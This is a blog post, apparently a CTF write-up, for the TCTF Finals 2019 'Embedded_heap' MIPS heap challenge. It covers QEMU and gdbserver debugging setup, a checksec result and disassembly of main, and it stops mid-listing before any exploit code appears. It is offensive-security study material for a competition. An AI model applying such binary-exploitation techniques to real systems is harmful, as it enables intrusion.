<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="referrer" content="no-referrer" />
    <meta name="description" content="12MIPS PWN Debug with QEMU(System &amp;&amp; User Mode)OFF By NuLL in libc-2.29 0x01 Embedded_heapDebugLocalhost:123gdb-multiarch  .&#x2F;embedded_heap  -q#set architecture mips:isa32r2#target remote">
<meta property="og:type" content="article">
<meta property="og:title" content="TCTF Finals 2019 Embedded_heap">
<meta property="og:url" content="http://yoursite.com/2019/06/20/TCTF-Finals-2019-Embedded-heap/index.html">
<meta property="og:site_name" content="Kirin&#39;s Blog">
<meta property="og:description" content="12MIPS PWN Debug with QEMU(System &amp;&amp; User Mode)OFF By NuLL in libc-2.29 0x01 Embedded_heapDebugLocalhost:123gdb-multiarch  .&#x2F;embedded_heap  -q#set architecture mips:isa32r2#target remote">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2019-06-20T03:42:40.000Z">
<meta property="article:modified_time" content="2019-08-06T01:36:08.000Z">
<meta property="article:author" content="Kirin">
<meta name="twitter:card" content="summary">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>TCTF Finals 2019 Embedded_heap</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 4.2.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2019/07/28/LOST-YOU-FOREVER/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2019/06/13/TCTF-2019-Finals-in-Shanghai/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/06/20/TCTF-Finals-2019-Embedded-heap/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/06/20/TCTF-Finals-2019-Embedded-heap/&text=TCTF Finals 2019 Embedded_heap" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/06/20/TCTF-Finals-2019-Embedded-heap/&title=TCTF Finals 2019 Embedded_heap" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/06/20/TCTF-Finals-2019-Embedded-heap/&is_video=false&description=TCTF Finals 2019 Embedded_heap" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=TCTF Finals 2019 Embedded_heap&body=Check out this article: http://yoursite.com/2019/06/20/TCTF-Finals-2019-Embedded-heap/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/06/20/TCTF-Finals-2019-Embedded-heap/&title=TCTF Finals 2019 Embedded_heap" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/06/20/TCTF-Finals-2019-Embedded-heap/&title=TCTF Finals 2019 Embedded_heap" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/06/20/TCTF-Finals-2019-Embedded-heap/&title=TCTF Finals 2019 Embedded_heap" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/06/20/TCTF-Finals-2019-Embedded-heap/&title=TCTF Finals 2019 Embedded_heap" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/06/20/TCTF-Finals-2019-Embedded-heap/&name=TCTF Finals 2019 Embedded_heap&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Embedded-heap"><span class="toc-number">1.</span> <span class="toc-text">0x01 Embedded_heap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Debug"><span class="toc-number">1.1.</span> <span class="toc-text">Debug</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Localhost"><span class="toc-number">1.1.1.</span> <span class="toc-text">Localhost:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exec-Environment"><span class="toc-number">1.1.2.</span> <span class="toc-text">Exec Environment:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Successful"><span class="toc-number">1.1.3.</span> <span class="toc-text">Successful:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze"><span class="toc-number">1.2.</span> <span class="toc-text">Analyze</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit"><span class="toc-number">1.3.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">1.4.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-babyheap"><span class="toc-number">2.</span> <span class="toc-text">0x02 babyheap</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        TCTF Finals 2019 Embedded_heap
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Kirin's Blog</span>
      </span>
      
    <div class="postdate">
        <time datetime="2019-06-20T03:42:40.000Z" itemprop="datePublished">2019-06-20</time>
    </div>


      

      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MIPS PWN Debug with QEMU(System &amp;&amp; User Mode)</span><br><span class="line">OFF By NuLL in libc-2.29</span><br></pre></td></tr></table></figure>
<h2 id="0x01-Embedded-heap"><a href="#0x01-Embedded-heap" class="headerlink" title="0x01 Embedded_heap"></a>0x01 Embedded_heap</h2><h3 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h3><h4 id="Localhost"><a href="#Localhost" class="headerlink" title="Localhost:"></a>Localhost:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch  .&#x2F;embedded_heap  -q</span><br><span class="line">#set architecture mips:isa32r2</span><br><span class="line">#target remote :1234</span><br></pre></td></tr></table></figure>
<h4 id="Exec-Environment"><a href="#Exec-Environment" class="headerlink" title="Exec Environment:"></a>Exec Environment:</h4><p><strong>User Mode:</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot . .&#x2F;qemu-mips  .&#x2F;embedded_heap  #qemu-mips (static)</span><br><span class="line">or</span><br><span class="line">qemu-mips  -L .&#x2F;  .&#x2F;embedded_heap</span><br></pre></td></tr></table></figure>
<p><strong>System Mode:</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-mips -M malta -cpu 24Kf -m 256 -nographic \</span><br><span class="line">  -kernel vmlinux-4.9.0-9-4kc-malta \</span><br><span class="line">  -initrd kirin.cpio.gz \</span><br><span class="line">  -device virtio-net,netdev&#x3D;net0 \</span><br><span class="line">  -netdev user,id&#x3D;net0,hostfwd&#x3D;tcp::1234-:1234 \</span><br><span class="line">  -monitor null \</span><br><span class="line">#固定cpio.gz文件系统，cpio解压时sudo，普通用户有时会解压不全</span><br><span class="line">#而后更改文件系统，再chown入普通用户，重新构建cpio.gz即可</span><br></pre></td></tr></table></figure>
<p><strong>gdbserver:</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;rapid7&#x2F;embedded-tools&#x2F;tree&#x2F;master&#x2F;binaries&#x2F;gdbserver</span><br><span class="line">#gdbserver  :1234  .&#x2F;embedded_heap</span><br></pre></td></tr></table></figure>
<p><strong>Another Way:</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;sbin&#x2F;xinetd -stayalive</span><br></pre></td></tr></table></figure>
<p>同时:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#cat etc&#x2F;xinetd.d&#x2F;embedded_heap </span><br><span class="line">service embedded_heap</span><br><span class="line">&#123;</span><br><span class="line">	disable &#x3D; no</span><br><span class="line">	type &#x3D; UNLISTED</span><br><span class="line">	flags &#x3D; REUSE</span><br><span class="line">	wait &#x3D; no</span><br><span class="line">	socket_type &#x3D; stream</span><br><span class="line">	protocol &#x3D; tcp</span><br><span class="line">	bind &#x3D; 0.0.0.0</span><br><span class="line">	rlimit_cpu &#x3D; 60</span><br><span class="line">	port &#x3D; 9334</span><br><span class="line">	user &#x3D; ctf</span><br><span class="line">	group &#x3D; ctf</span><br><span class="line">	server &#x3D; &#x2F;embedded_heap</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此时run.sh</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-mips -M malta -cpu 24Kf -m 256 -nographic \</span><br><span class="line">  -kernel vmlinux-4.9.0-9-4kc-malta \</span><br><span class="line">  -initrd kirin.cpio.gz \</span><br><span class="line">  -device virtio-net,netdev&#x3D;net0 \</span><br><span class="line">  -netdev user,id&#x3D;net0,hostfwd&#x3D;tcp::1234-:1234,hostfwd&#x3D;tcp::9334-:9334 \</span><br><span class="line">  -monitor null \</span><br></pre></td></tr></table></figure>
<p>其中9334用于程序运行交互，1234用于gdbserver调试(PID,在连接后即会看到新的程序进程)</p>
<h4 id="Successful"><a href="#Successful" class="headerlink" title="Successful:"></a>Successful:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">0x4c69a000 0x4c69b000 rwxp     1000 0      </span><br><span class="line">0x55555000 0x55557000 r-xp     2000 0      &#x2F;embedded_heap</span><br><span class="line">0x55566000 0x55567000 r-xp     1000 1000   &#x2F;embedded_heap</span><br><span class="line">0x55567000 0x55568000 rwxp     1000 2000   &#x2F;embedded_heap</span><br><span class="line">0x55568000 0x55569000 rwxp     1000 0      [heap]</span><br><span class="line">0x77f80000 0x77fd2000 r-xp    52000 0      &#x2F;lib&#x2F;libuClibc-0.9.33.2.so</span><br><span class="line">0x77fd2000 0x77fe1000 ---p     f000 0      </span><br><span class="line">0x77fe1000 0x77fe2000 r-xp     1000 51000  &#x2F;lib&#x2F;libuClibc-0.9.33.2.so</span><br><span class="line">0x77fe2000 0x77fe3000 rwxp     1000 52000  &#x2F;lib&#x2F;libuClibc-0.9.33.2.so</span><br><span class="line">0x77fe3000 0x77fe8000 rwxp     5000 0      </span><br><span class="line">0x77fe8000 0x77fef000 r-xp     7000 0      &#x2F;lib&#x2F;ld-uClibc-0.9.33.2.so</span><br><span class="line">0x77ffa000 0x77ffc000 rwxp     2000 0      </span><br><span class="line">0x77ffc000 0x77ffd000 r--p     1000 0      [vvar]</span><br><span class="line">0x77ffd000 0x77ffe000 r-xp     1000 0      [vdso]</span><br><span class="line">0x77ffe000 0x77fff000 r-xp     1000 6000   &#x2F;lib&#x2F;ld-uClibc-0.9.33.2.so</span><br><span class="line">0x77fff000 0x78000000 rwxp     1000 7000   &#x2F;lib&#x2F;ld-uClibc-0.9.33.2.so</span><br><span class="line">0x7fc31000 0x7ffff000 rw-p   3ce000 0      [stack]</span><br><span class="line">0x7ffff000 0x80000000 r-xp     1000 0</span><br></pre></td></tr></table></figure>
<h3 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">checksec .&#x2F;embedded_heap </span><br><span class="line">[!] Could not populate PLT: Invalid memory write (UC_ERR_WRITE_UNMAPPED)</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;kirin&#x2F;tctf&#x2F;mipspwn&#x2F;embedded_heap&#39;</span><br><span class="line">    Arch:     mips-32-big</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p><strong>NX-&gt;has RWX??</strong><br>比赛时候没有仔细看，在System Mode下调试即可发现，其一些段可读可写可执行(<strong>好像是MIPS没实现NX??</strong>，还有可能是因为他的动态库没有NX保护)，从权限看只是对栈进行了控制<br>程序:<br>main：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line">.text:000019F4  # int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:000019F4                 .globl main</span><br><span class="line">.text:000019F4 main:                                    # DATA XREF: LOAD:0000045C↑o</span><br><span class="line">.text:000019F4                                          # _ftext+1C↑o ...</span><br><span class="line">.text:000019F4</span><br><span class="line">.text:000019F4 var_18          &#x3D; -0x18</span><br><span class="line">.text:000019F4 var_C           &#x3D; -0xC</span><br><span class="line">.text:000019F4 var_8           &#x3D; -8</span><br><span class="line">.text:000019F4 var_4           &#x3D; -4</span><br><span class="line">.text:000019F4</span><br><span class="line">.text:000019F4                 li      $gp, 0x1860C     # Load Immediate</span><br><span class="line">.text:000019FC                 addu    $gp, $t9         # Add Unsigned</span><br><span class="line">.text:00001A00                 addiu   $sp, -0x28       # Add Immediate Unsigned</span><br><span class="line">.text:00001A04                 sw      $ra, 0x28+var_4($sp)  # Store Word</span><br><span class="line">.text:00001A08                 sw      $fp, 0x28+var_8($sp)  # Store Word</span><br><span class="line">.text:00001A0C                 move    $fp, $sp</span><br><span class="line">.text:00001A10                 sw      $gp, 0x28+var_18($sp)  # Store Word</span><br><span class="line">.text:00001A14                 li      $v0, 0           # Load Immediate</span><br><span class="line">.text:00001A18                 addiu   $v0, setbuf      # Add Immediate Unsigned</span><br><span class="line">.text:00001A1C                 move    $t9, $v0</span><br><span class="line">.text:00001A20                 jalr    $t9 ; setbuf     # Jump And Link Register</span><br><span class="line">.text:00001A24                 nop</span><br><span class="line">.text:00001A28                 lw      $gp, 0x28+var_18($fp)  # Load Word</span><br><span class="line">.text:00001A2C                 sw      $v0, 0x28+var_C($fp)  # Store Word</span><br><span class="line">.text:00001A30</span><br><span class="line">.text:00001A30 loc_1A30:                                # CODE XREF: main:loc_1BA4↓j</span><br><span class="line">.text:00001A30                 li      $v0, 0           # Load Immediate</span><br><span class="line">.text:00001A34                 addiu   $v0, menu        # Add Immediate Unsigned</span><br><span class="line">.text:00001A38                 move    $t9, $v0</span><br><span class="line">.text:00001A3C                 jalr    $t9 ; menu       # Jump And Link Register</span><br><span class="line">.text:00001A40                 nop</span><br><span class="line">.text:00001A44                 lw      $gp, 0x28+var_18($fp)  # Load Word</span><br><span class="line">.text:00001A48                 li      $v0, 0           # Load Immediate</span><br><span class="line">.text:00001A4C                 addiu   $v0, get_num     # Add Immediate Unsigned</span><br><span class="line">.text:00001A50                 move    $t9, $v0</span><br><span class="line">.text:00001A54                 jalr    $t9 ; get_num    # Jump And Link Register</span><br><span class="line">.text:00001A58                 nop</span><br><span class="line">.text:00001A5C                 lw      $gp, 0x28+var_18($fp)  # Load Word</span><br><span class="line">.text:00001A60                 li      $v1, 2           # Load Immediate</span><br><span class="line">.text:00001A64                 beq     $v0, $v1, loc_1AD0  # Branch on Equal</span><br><span class="line">.text:00001A68                 nop</span><br><span class="line">.text:00001A6C                 slti    $v1, $v0, 3      # Set on Less Than Immediate</span><br><span class="line">.text:00001A70                 beqz    $v1, loc_1A8C    # Branch on Zero</span><br><span class="line">.text:00001A74                 nop</span><br><span class="line">.text:00001A78                 li      $v1, 1           # Load Immediate</span><br><span class="line">.text:00001A7C                 beq     $v0, $v1, loc_1AAC  # Branch on Equal</span><br><span class="line">.text:00001A80                 nop</span><br><span class="line">.text:00001A84                 b       loc_1B98         # Branch Always</span><br><span class="line">.text:00001A88                 nop</span><br><span class="line">.text:00001A8C  # ---------------------------------------------------------------------------</span><br><span class="line">.text:00001A8C</span><br><span class="line">.text:00001A8C loc_1A8C:                                # CODE XREF: main+7C↑j</span><br><span class="line">.text:00001A8C                 li      $v1, 3           # Load Immediate</span><br><span class="line">.text:00001A90                 beq     $v0, $v1, loc_1AF4  # Branch on Equal</span><br><span class="line">.text:00001A94                 nop</span><br><span class="line">.text:00001A98                 li      $v1, 5           # Load Immediate</span><br><span class="line">.text:00001A9C                 beq     $v0, $v1, loc_1B8C  # Branch on Equal</span><br><span class="line">.text:00001AA0                 nop</span><br><span class="line">.text:00001AA4                 b       loc_1B98         # Branch Always</span><br><span class="line">.text:00001AA8                 nop</span><br><span class="line">.text:00001AAC  # ---------------------------------------------------------------------------</span><br><span class="line">.text:00001AAC</span><br><span class="line">.text:00001AAC loc_1AAC:                                # CODE XREF: main+88↑j</span><br><span class="line">.text:00001AAC                 lw      $a0, 0x28+var_C($fp)  # Load Word</span><br><span class="line">.text:00001AB0                 li      $v0, 0           # Load Immediate</span><br><span class="line">.text:00001AB4                 addiu   $v0, update      # Add Immediate Unsigned</span><br><span class="line">.text:00001AB8                 move    $t9, $v0</span><br><span class="line">.text:00001ABC                 jalr    $t9 ; update     # Jump And Link Register</span><br><span class="line">.text:00001AC0                 nop</span><br><span class="line">.text:00001AC4                 lw      $gp, 0x28+var_18($fp)  # Load Word</span><br><span class="line">.text:00001AC8                 b       loc_1BA4         # Branch Always</span><br><span class="line">.text:00001ACC                 nop</span><br><span class="line">.text:00001AD0  # ---------------------------------------------------------------------------</span><br><span class="line">.text:00001AD0</span><br><span class="line">.text:00001AD0 loc_1AD0:                                # CODE XREF: main+70↑j</span><br><span class="line">.text:00001AD0                 lw      $a0, 0x28+var_C($fp)  # Load Word</span><br><span class="line">.text:00001AD4                 li      $v0, 0           # Load Immediate</span><br><span class="line">.text:00001AD8                 addiu   $v0, view        # Add Immediate Unsigned</span><br><span class="line">.text:00001ADC                 move    $t9, $v0</span><br><span class="line">.text:00001AE0                 jalr    $t9 ; view       # Jump And Link Register</span><br><span class="line">.text:00001AE4                 nop</span><br><span class="line">.text:00001AE8                 lw      $gp, 0x28+var_18($fp)  # Load Word</span><br><span class="line">.text:00001AEC                 b       loc_1BA4         # Branch Always</span><br><span class="line">.text:00001AF0                 nop</span><br><span class="line">.text:00001AF4  # ---------------------------------------------------------------------------</span><br><span class="line">.text:00001AF4</span><br><span class="line">.text:00001AF4 loc_1AF4:                                # CODE XREF: main+9C↑j</span><br><span class="line">.text:00001AF4                 lw      $a0, 0x28+var_C($fp)  # Load Word</span><br><span class="line">.text:00001AF8                 li      $v0, 0           # Load Immediate</span><br><span class="line">.text:00001AFC                 addiu   $v0, pwn         # Add Immediate Unsigned</span><br><span class="line">.text:00001B00                 move    $t9, $v0</span><br><span class="line">.text:00001B04                 jalr    $t9 ; pwn        # Jump And Link Register</span><br><span class="line">.text:00001B08                 nop</span><br><span class="line">.text:00001B0C                 lw      $gp, 0x28+var_18($fp)  # Load Word</span><br><span class="line">.text:00001B10                 li      $v0, 0           # Load Immediate</span><br><span class="line">.text:00001B14                 addiu   $a0, $v0, aOneMoreTimeTry  # &quot;One more time! Try it harder!&quot;</span><br><span class="line">.text:00001B18                 la      $v0, puts        # Load Address</span><br><span class="line">.text:00001B1C                 move    $t9, $v0</span><br><span class="line">.text:00001B20                 jalr    $t9 ; puts       # Jump And Link Register</span><br><span class="line">.text:00001B24                 nop</span><br><span class="line">.text:00001B28                 lw      $gp, 0x28+var_18($fp)  # Load Word</span><br><span class="line">.text:00001B2C                 lw      $a0, 0x28+var_C($fp)  # Load Word</span><br><span class="line">.text:00001B30                 li      $v0, 0           # Load Immediate</span><br><span class="line">.text:00001B34                 addiu   $v0, pwn         # Add Immediate Unsigned</span><br><span class="line">.text:00001B38                 move    $t9, $v0</span><br><span class="line">.text:00001B3C                 jalr    $t9 ; pwn        # Jump And Link Register</span><br><span class="line">.text:00001B40                 nop</span><br><span class="line">.text:00001B44                 lw      $gp, 0x28+var_18($fp)  # Load Word</span><br><span class="line">.text:00001B48                 li      $v0, 0           # Load Immediate</span><br><span class="line">.text:00001B4C                 addiu   $a0, $v0, aEverythingIsSt  # &quot;Everything is still fine. Is that all y&quot;...</span><br><span class="line">.text:00001B50                 la      $v0, puts        # Load Address</span><br><span class="line">.text:00001B54                 move    $t9, $v0</span><br><span class="line">.text:00001B58                 jalr    $t9 ; puts       # Jump And Link Register</span><br><span class="line">.text:00001B5C                 nop</span><br><span class="line">.text:00001B60                 lw      $gp, 0x28+var_18($fp)  # Load Word</span><br><span class="line">.text:00001B64                 lw      $a0, 0x28+var_C($fp)  # Load Word</span><br><span class="line">.text:00001B68                 li      $v0, 0           # Load Immediate</span><br><span class="line">.text:00001B6C                 addiu   $v0, update      # Add Immediate Unsigned</span><br><span class="line">.text:00001B70                 move    $t9, $v0</span><br><span class="line">.text:00001B74                 jalr    $t9 ; update     # Jump And Link Register</span><br><span class="line">.text:00001B78                 nop</span><br><span class="line">.text:00001B7C                 lw      $gp, 0x28+var_18($fp)  # Load Word</span><br><span class="line">.text:00001B80                 move    $v0, $zero</span><br><span class="line">.text:00001B84                 b       loc_1BAC         # Branch Always</span><br><span class="line">.text:00001B88                 nop</span><br><span class="line">.text:00001B8C  # ---------------------------------------------------------------------------</span><br><span class="line">.text:00001B8C</span><br><span class="line">.text:00001B8C loc_1B8C:                                # CODE XREF: main+A8↑j</span><br><span class="line">.text:00001B8C                 move    $v0, $zero</span><br><span class="line">.text:00001B90                 b       loc_1BAC         # Branch Always</span><br><span class="line">.text:00001B94                 nop</span><br><span class="line">.text:00001B98  # ---------------------------------------------------------------------------</span><br><span class="line">.text:00001B98</span><br><span class="line">.text:00001B98 loc_1B98:                                # CODE XREF: main+90↑j</span><br><span class="line">.text:00001B98                                          # main+B0↑j</span><br><span class="line">.text:00001B98                 li      $v0, 1           # Load Immediate</span><br><span class="line">.text:00001B9C                 b       loc_1BAC         # Branch Always</span><br><span class="line">.text:00001BA0                 nop</span><br><span class="line">.text:00001BA4  # ---------------------------------------------------------------------------</span><br><span 